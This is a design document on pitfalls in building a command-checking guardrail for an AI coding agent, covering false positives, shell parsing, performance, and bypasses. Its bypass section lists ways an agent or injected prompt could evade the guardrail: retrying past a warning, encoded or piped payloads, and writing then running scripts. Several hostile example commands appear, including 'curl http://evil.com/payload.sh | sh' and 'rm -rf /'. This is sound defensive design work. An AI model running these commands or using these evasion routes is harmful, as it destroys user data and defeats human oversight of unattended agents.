# Domain Pitfalls

**Domain:** AI Agent Safety Guardrail (Claude Code Plugin)
**Project:** yolo-safeguard
**Researched:** 2026-05-18

---

## Critical Pitfalls

Mistakes that cause user abandonment, security bypasses, or architectural rewrites.

---

### Pitfall 1: False Positives — The #1 Killer

**Severity:** CRITICAL
**What goes wrong:** The tool blocks legitimate operations, destroying user trust and triggering uninstalls. This is the single most common failure mode for safety tools. claude-code-safety-net's GitHub issues are dominated by false positive reports.

**Root causes:**
- String literals in arguments triggering blocks: `gh issue create --body "never run git reset --hard"`
- Commands mentioned in comments/documentation being flagged: `echo "# WARNING: do not run rm -rf /"`
- Safe variants confused with dangerous ones: `rm file.tmp` flagged the same as `rm -rf /`
- Regex patterns matching substrings: `format` matching inside `information`
- File paths containing "dangerous" words: `/usr/lib/python3/dist-packages/rm/`

**Consequences:**
- User fatigue leads to uninstall within days
- Users disable the tool entirely rather than deal with interruptions
- Negative reviews kill adoption ("this thing blocks everything")
- The tool that blocks too much is worse than no tool at all

**Prevention:**
1. **Context-aware parsing, not string matching** — Parse the full command AST, then evaluate each token in its execution role (command, argument, string literal, comment)
2. **Execution context hierarchy** — A token in command position (`rm -rf /`) is dangerous; the same token inside a quoted argument (`--body "rm -rf /"`) is text content
3. **Severity threshold calibration** — Only CRITICAL and HIGH severity actually block; MEDIUM/LOW are silent unless user queries the log
4. **Allowlist escape hatch** — Users can whitelist specific patterns that keep triggering for their workflow
5. **Test against real-world command corpora** — Collect 1000+ real Claude Code commands and verify zero false positives before release

**Detection (you're failing here if):**
- More than 1 false positive per 100 commands
- GitHub issues about false positives within first week of release
- Users adding many allowlist entries

**Phase:** v0.1 core design — This must be architecturally solved from day 1. Retrofitting context-awareness onto a regex engine is a rewrite.

---

### Pitfall 2: Shell Parsing Edge Cases

**Severity:** CRITICAL
**What goes wrong:** The parser fails to correctly interpret shell commands, leading to both false positives (blocking safe commands) and false negatives (missing dangerous ones hidden in complex syntax).

**Root causes:**
- **Windows vs POSIX divergence:** PowerShell uses `-Force` not `-f`, `Remove-Item` not `rm`, backtick escaping not backslash, `$null` not `/dev/null`
- **Nested quoting:** `bash -c 'rm -rf "$(pwd)"'` — must recursively parse the inner command
- **Variable expansion:** `rm -rf $DIR` — the value of `$DIR` is unknowable at parse time; it could be `/` or `./temp`
- **Here-docs:** Content between `<<EOF` delimiters may contain commands but is not executed directly
- **Process/command substitution:** `$(command)`, `` `command` `` — the inner command IS executed
- **Semicolons/pipes/&&:** `echo safe; rm -rf /` — must parse the full pipeline
- **Aliases and functions:** `alias yeet='rm -rf'` then `yeet /` — not detectable without shell state
- **Glob expansion:** `rm -rf ./*` is very different from `rm -rf /*` but syntactically similar

**Consequences:**
- Security bypass via creative shell syntax
- False positives on valid but complex commands
- Platform-specific bugs that only surface on Windows or only on macOS

**Prevention:**
1. **Use `shell-quote` for POSIX parsing** — proven library, handles quoting and operators; do NOT write a custom parser
2. **Explicit "unknown = warn" strategy** — If the parser cannot fully understand a command, escalate to MEDIUM (warn) rather than silently passing
3. **Recursive parsing for nested commands** — When detecting `bash -c`, `sh -c`, `eval`, extract and parse the inner string
4. **PowerShell-specific parser path** — Detect platform and apply appropriate syntax rules; PowerShell cmdlets have completely different naming patterns
5. **Command substitution extraction** — Parse `$(...)` and `` `...` `` as additional commands to analyze
6. **Conservative on variables** — Treat `rm -rf $VAR` as MEDIUM risk (unknown target) rather than LOW (probably fine)

**Detection (you're failing here if):**
- Different behavior on Windows vs macOS for equivalent operations
- Users report "it didn't catch" a clearly dangerous command
- Complex one-liners consistently bypass detection

**Phase:** v0.1 — Parser selection and strategy is foundational architecture. `shell-quote` for POSIX is the proven choice; PowerShell parsing needs a separate strategy (possibly regex-based cmdlet matching since PowerShell is more structured).

---

### Pitfall 3: Performance — Process Startup Latency

**Severity:** CRITICAL
**What goes wrong:** The safety check adds perceptible delay to every command, making YOLO mode feel sluggish and negating the efficiency benefit that motivated using YOLO in the first place.

**Root causes:**
- **Node.js cold start:** 100-500ms depending on module count and machine
- **npx execution:** 5-7 seconds of overhead (registry check, cache resolution, temp extraction)
- **Large dependency tree:** Each `require()` adds to startup time
- **TypeScript compilation at runtime:** If using ts-node or tsx without pre-compilation
- **Dynamic imports:** Lazy loading sounds good but causes unpredictable latency spikes

**Consequences:**
- User perceives "AI is slower with safeguard installed"
- Violates the <50ms analysis constraint
- Users uninstall for performance before experiencing any safety benefit
- "It made my agent 2x slower" reviews destroy adoption

**Prevention:**
1. **Pre-built single file** — Bundle everything into one .js file with Bun's bundler; eliminate all runtime module resolution
2. **Direct node invocation** — Plugin calls `node /path/to/safeguard.js` directly; NEVER use npx in the hot path
3. **Minimal dependencies (<=3)** — Each dependency adds startup cost; `shell-quote` is necessary, almost everything else can be inlined
4. **Warm start architecture** — Consider a long-running process that the hook communicates with via IPC/stdin if cold start proves too slow
5. **Benchmark CI gate** — Automated test that fails if analysis exceeds 50ms on reference hardware
6. **No dynamic imports** — Everything must be statically bundled and immediately available

**Detection (you're failing here if):**
- `time node safeguard.js "echo hello"` exceeds 80ms (50ms target + 30ms margin)
- Users report "lag" or "delay" in their workflow
- Agent appears to "pause" before executing commands

**Phase:** v0.1 architecture — Distribution format and invocation method must be decided at project inception. Cannot retrofit a fast path onto a slow architecture.

---

### Pitfall 4: The "already_warned" Trap

**Severity:** CRITICAL
**What goes wrong:** A guardrail that warns once then allows subsequent attempts can be trivially bypassed by a determined AI agent that simply retries the operation.

**Root causes:**
- Claude Code's built-in `security-guidance` plugin uses this exact pattern: first attempt triggers a warning, second attempt passes through silently
- The assumption is "the human saw the warning and consciously chose to proceed" — but in YOLO mode, no human is watching
- AI agents can learn (within session) that retrying bypasses the guardrail
- Session state tracking means "saw warning for rm -rf" incorrectly applies to ALL subsequent rm -rf commands regardless of target

**Consequences:**
- Complete security bypass for any CRITICAL operation via simple retry
- False sense of security — user thinks they're protected, but AI just retries
- In YOLO mode specifically, warnings without blocks provide zero protection because there's no human to read them

**Prevention:**
1. **CRITICAL rules ALWAYS block** — No "already warned" state for destructive operations. Every invocation of `rm -rf /`, `DROP DATABASE`, `git push --force` must be independently evaluated and blocked
2. **Severity determines behavior, not history** — A CRITICAL command is CRITICAL every time, not just the first time
3. **Session awareness for MEDIUM only** — Only suppress repeated warnings for non-dangerous patterns (e.g., "you're using eval in a test file" — warn once per session is fine)
4. **No escalation path without human** — In YOLO mode, CRITICAL blocks cannot be "confirmed" by the AI; they require genuine human intervention (terminal prompt or config file change)

**Detection (you're failing here if):**
- Same dangerous command passes on second attempt
- AI agent logs show "retried and succeeded" patterns
- Users report "it warned me once then never again"

**Phase:** v0.1 core design — The response system architecture must encode this principle from the start: severity level determines behavior, session state never weakens protection for CRITICAL/HIGH.

---

### Pitfall 5: Bypass via Indirection

**Severity:** CRITICAL
**What goes wrong:** An AI agent (or malicious prompt injection) circumvents command-level detection by executing dangerous operations through indirect paths that the guardrail doesn't monitor.

**Attack vectors:**
- **Write-then-execute:** AI writes `malicious.sh` via Write tool, then runs `bash malicious.sh` via Bash tool — if we only parse the Bash command, we see `bash malicious.sh` (harmless-looking)
- **Interpreter indirection:** `python -c "import os; os.system('rm -rf /')"` — the actual dangerous command is inside a Python string
- **Encoded commands:** `echo cm0gLXJmIC8= | base64 -d | sh` — the command is base64-encoded, invisible to string matching
- **File-based indirection:** `curl http://evil.com/payload.sh | sh` — command comes from network
- **Makefile/script execution:** `make clean` where the Makefile contains destructive operations
- **npm scripts:** `npm run deploy` where package.json scripts contain dangerous commands
- **Environment variable injection:** Setting `$PATH` to shadow safe commands with malicious ones

**Consequences:**
- Complete bypass of all shell-level protections
- False sense of security — user thinks dangerous operations are impossible
- Sophisticated attacks go completely undetected

**Prevention:**
1. **Interpreter detection (v0.1)** — Recognize `python -c`, `ruby -e`, `node -e`, `perl -e`, `bash -c`, `sh -c`, `eval` and parse the inner command string for dangerous patterns
2. **Known dangerous patterns for indirection** — Flag `| sh`, `| bash`, `base64 -d | sh`, `curl ... | sh`, `wget ... | sh` as inherently HIGH risk
3. **Write-Execute correlation (v0.2)** — When Write tool creates an executable file and Bash tool subsequently runs it, analyze the written content as if it were a command
4. **Script content analysis (v0.2)** — When `bash script.sh` is called, read the script content and analyze it (if file is accessible)
5. **Accept imperfection** — Some indirection (e.g., `make clean`) cannot be fully analyzed without reading every referenced file; document known limitations honestly

**Detection (you're failing here if):**
- `python -c "import shutil; shutil.rmtree('/')"` passes undetected
- `echo <base64> | base64 -d | sh` passes undetected
- Write tool creates a destructive script and Bash executes it without warning

**Phase:** v0.1 (interpreter detection, pipe-to-shell detection), v0.2 (Write-Execute correlation, script content analysis)

---

### Pitfall 6: Windows Path Normalization

**Severity:** HIGH
**What goes wrong:** Path-based rules and comparisons fail on Windows due to fundamental differences in how paths are represented, leading to both false positives (blocking safe paths) and bypasses (dangerous paths not matching rules).

**Root causes:**
- **Slash direction:** `C:\Users\dev` vs `C:/Users/dev` — both valid on Windows, tools mix them freely
- **Case sensitivity:** Windows paths are case-insensitive (`C:\USERS` === `c:\users`) but comparison code often uses strict equality
- **Drive letters:** `C:\path` has no Unix equivalent; path.resolve behaves differently
- **UNC paths:** `\\server\share\path` — rare but real in enterprise environments
- **Short names:** `C:\PROGRA~1` === `C:\Program Files` — legacy but still appears
- **Path separators in shell commands:** `rm ./path/to/file` uses forward slash even on Windows when in git bash or WSL
- **Cross-environment confusion:** Git Bash on Windows uses `/c/Users/`, PowerShell uses `C:\Users\`, cmd uses `C:\Users\`

**Consequences:**
- Rules that work on macOS/Linux silently fail on Windows
- Windows users experience different (worse) protection levels
- Path-based allowlists don't match the paths the tool actually encounters

**Prevention:**
1. **Normalize all paths immediately on input** — Use `path.resolve()` + `path.normalize()` before any comparison
2. **Case-insensitive comparison on Windows** — Detect platform and lowercase all paths before matching (using `path.sep` and `process.platform`)
3. **Accept both slash types** — Normalize to OS-native separator internally but accept either in config
4. **Test on actual Windows** — Not just "should work on Windows" — CI must run on Windows
5. **Drive letter normalization** — Uppercase drive letters consistently (`c:` -> `C:`)

**Detection (you're failing here if):**
- Same file path doesn't match allowlist on Windows
- Rules with hardcoded `/` fail on Windows
- Case differences in paths cause unexpected blocks/passes

**Phase:** v0.1 — Path handling is used in allowlists, CWD-based context, and file operation analysis. Must be correct from the start.

---

## Moderate Pitfalls

---

### Pitfall 7: User Fatigue Leading to Uninstall

**Severity:** HIGH
**What goes wrong:** Even with good detection accuracy, too-frequent interruptions cause users to remove the tool entirely, leaving them with zero protection.

**Root causes:**
- Every warning requires cognitive context-switch from the user
- MEDIUM-severity warnings that don't actually block feel like nagging
- Users who chose YOLO mode explicitly value uninterrupted flow
- Cumulative annoyance is exponential, not linear (the 10th warning is 10x more annoying than the 1st)

**Prevention:**
1. **Only CRITICAL and HIGH actually interrupt workflow** — These are true "stop everything" moments (irreversible destruction)
2. **MEDIUM and LOW are completely silent** — Logged for later review but never shown during execution
3. **Configurable verbosity** — Users who want more visibility can opt-in to see MEDIUM warnings
4. **"Report card" approach** — After a session, user can run `yolo-safeguard report` to see what was silently flagged
5. **Measure interrupt rate** — Target: <1 interrupt per 100 commands in normal development workflow

**Detection (you're failing here if):**
- Users report "it's too noisy" or "constant warnings"
- Uninstall rate is high in first week
- GitHub issues requesting "how to disable X warning"

**Phase:** v0.1 calibration — The graduated response system must be carefully tuned. Default calibration should err on the side of too quiet rather than too loud.

---

### Pitfall 8: Community Trust — Security Tool Must Be Itself Secure

**Severity:** HIGH
**What goes wrong:** A security tool that has its own vulnerabilities, suspicious behaviors, or opaque code destroys trust instantly and gets publicly called out.

**Root causes:**
- Using `eval()` or dynamic code execution anywhere in the codebase
- Making network calls (telemetry, update checks, analytics)
- Having many dependencies (larger attack surface, supply chain risk)
- Closed-source or obfuscated code that can't be audited
- Requesting permissions beyond what's needed

**Consequences:**
- Public security advisory against the tool
- "Security tool is itself insecure" headlines
- Complete loss of credibility — unrecoverable for a security project

**Prevention:**
1. **MIT license, fully open source** — Every line of code auditable
2. **Zero network calls** — No telemetry, no update checks, no analytics, no phone-home
3. **Minimal dependencies (<=3)** — Reduce supply chain attack surface; audit each dependency
4. **No eval, no Function constructor, no dynamic require** — Linting rule to enforce
5. **No file system writes beyond audit log** — Read-only relationship with user's project
6. **Lockfile + pinned versions** — Deterministic installs, auditable dependency tree
7. **Security policy in README** — Responsible disclosure process from day 1

**Detection (you're failing here if):**
- `npm audit` shows vulnerabilities in dependencies
- Anyone finds network calls in source code
- Code review reveals eval or dynamic execution

**Phase:** Day 1 — These are project principles, not features. Must be established before first commit.

---

### Pitfall 9: Stateless Analysis Misses Multi-Step Attacks

**Severity:** MEDIUM
**What goes wrong:** Each command is analyzed in isolation, missing attack patterns that span multiple operations (e.g., `cd /` then `rm -rf .` is catastrophic, but `rm -rf .` alone might be fine in a project directory).

**Root causes:**
- Hook is invoked per-command with no memory of previous commands
- CWD changes between commands affect danger level
- Multi-step operations: disable safety → do dangerous thing → re-enable
- File creation followed by execution (Write → Bash correlation)

**Prevention:**
1. **CWD-aware analysis** — Claude Code hook receives `cwd`; use it as context (`rm -rf .` in `/` vs in `/project/temp/`)
2. **Accept statelessness for v0.1** — Per-command analysis with CWD context covers 90% of cases
3. **Session state for v0.2** — Track recent operations to detect patterns (escalating privilege, disabling safety tools)
4. **Conservative defaults** — When CWD is unknown or root-adjacent, escalate severity

**Phase:** v0.1 (CWD-aware), v0.2 (session state)

---

### Pitfall 10: Hook API Instability

**Severity:** MEDIUM
**What goes wrong:** Claude Code's PreToolUse hook API changes between versions, breaking the plugin silently (it stops being called, or the response format changes).

**Root causes:**
- Claude Code is actively developed with frequent updates
- Hook API is relatively new and may not be fully stable
- No formal stability guarantees for plugin APIs
- Breaking changes may not be announced in changelogs

**Prevention:**
1. **Defensive response format** — Always return valid JSON matching expected schema; validate inputs before processing
2. **Version detection** — Check Claude Code version at startup, warn if untested version
3. **Graceful degradation** — If hook receives unexpected input format, default to ALLOW (fail-open is safer than fail-closed for user experience, while logging the anomaly)
4. **Monitor upstream** — Watch Claude Code releases and plugin API changes
5. **Integration tests against real Claude Code** — Not just unit tests against mocked APIs

**Phase:** v0.1 (defensive coding), ongoing (version monitoring)

---

### Pitfall 11: Configuration Complexity Creep

**Severity:** MEDIUM
**What goes wrong:** The configuration system grows complex over time as edge cases are handled, eventually requiring a PhD to configure properly, contradicting the "zero-config" promise.

**Root causes:**
- Every false positive report tempts adding a configuration option
- Rule customization (severity overrides, pattern additions, path exclusions) compounds
- Per-project, per-user, per-workspace configs create precedence confusion
- Documentation can't keep up with config options

**Prevention:**
1. **Zero-config MUST always work well** — Configuration is for power users only; default experience never requires config
2. **Opinionated defaults** — Make decisions for users rather than exposing options
3. **Maximum 3 config concepts** — Rules, allowlist, severity overrides. Nothing more in v0.1
4. **Single config file location** — No multi-layer config inheritance in v0.1 (project-level only)
5. **Validate config strictly** — Reject unknown keys, provide clear error messages

**Phase:** v0.1 (establish config philosophy), ongoing (resist complexity)

---

## Minor Pitfalls

---

### Pitfall 12: Regex Catastrophic Backtracking

**Severity:** LOW (but can become CRITICAL if exploited)
**What goes wrong:** Complex regex patterns used for command matching enter catastrophic backtracking on carefully crafted input, causing the analysis to hang for seconds or minutes — effectively a denial-of-service.

**Prevention:**
1. Use atomic groups or possessive quantifiers where possible
2. Set explicit timeout on regex execution (Node.js doesn't natively support this, but can be mitigated with input length limits)
3. Prefer simple string operations over complex regex
4. Limit input length before regex processing (commands >10KB are suspicious anyway)
5. Fuzz-test regex patterns with pathological inputs

**Phase:** v0.1 (input length limits), v0.2 (fuzz testing)

---

### Pitfall 13: Audit Log Bloat

**Severity:** LOW
**What goes wrong:** The audit log grows unbounded, consuming disk space and eventually causing issues on machines with limited storage.

**Prevention:**
1. Log rotation with configurable max size (default: 10MB)
2. Structured log format (JSON lines) for efficient parsing
3. Only log decisions, not full command content (unless CRITICAL)
4. Provide `yolo-safeguard log --clear` command

**Phase:** v0.1 (basic logging), v0.2 (rotation and management)

---

### Pitfall 14: npm Package Name Squatting/Confusion

**Severity:** LOW
**What goes wrong:** Package name is taken, confusingly similar to another package, or typosquatted after publication.

**Prevention:**
1. Verify `yolo-safeguard` availability on npm before development begins
2. Register the name early (even with a placeholder package)
3. Consider defensive registrations for common typos

**Phase:** Pre-development (name registration)

---

## Phase-Specific Warnings

| Phase | Likely Pitfall | Severity | Mitigation |
|-------|---------------|----------|------------|
| v0.1 Core Design | False positives destroying trust | CRITICAL | Context-aware parsing from day 1; test against real command corpus |
| v0.1 Core Design | already_warned bypass | CRITICAL | CRITICAL rules always block, no session-based weakening |
| v0.1 Architecture | Process startup too slow | CRITICAL | Single-file bundle, direct node invocation, benchmark CI gate |
| v0.1 Parser | Shell edge cases causing bypass | CRITICAL | Use shell-quote, recursive parsing, "unknown = warn" |
| v0.1 Parser | Windows path failures | HIGH | Normalize all paths, case-insensitive on Windows, CI on Windows |
| v0.1 Calibration | Too noisy causing uninstall | HIGH | Only CRITICAL/HIGH interrupt; MEDIUM/LOW are silent |
| v0.1 Release | Untrusted security tool | HIGH | Zero deps where possible, no network, MIT license, no eval |
| v0.2 Write Hook | Write-then-execute bypass | CRITICAL | Cross-tool correlation, script content analysis |
| v0.2 Session | Multi-step attacks missed | MEDIUM | Session state tracking, CWD-aware analysis |
| v1.0+ Stability | Hook API breaking changes | MEDIUM | Defensive coding, version detection, graceful degradation |

---

## Risk Heat Map

```
                    IMPACT
            Low         Medium        High
         +----------+----------+----------+
  High   | Log Bloat| Config   | False    |
L        |          | Creep    | Positives|
I        +----------+----------+----------+
K  Med   | Regex    | Hook API | Bypass   |
E        | DoS      | Changes  | via      |
L        |          |          | Indirect |
I        +----------+----------+----------+
H  Low   | npm Name | Stateless| Perf     |
O        |          | Analysis | Latency  |
O        +----------+----------+----------+
D
```

Top-right quadrant (High Impact + High Likelihood) = must solve in v0.1:
- False Positives
- Shell Parsing
- Performance
- already_warned bypass

---

## Sources

- claude-code-safety-net repository analysis (architecture, limitations, issue patterns)
- Claude Code security-guidance plugin source analysis
- shell-quote npm package documentation
- Node.js process startup benchmarks (community measurements)
- Real-world YOLO mode usage patterns from Claude Code community
- Windows path normalization issues (Node.js path module documentation)
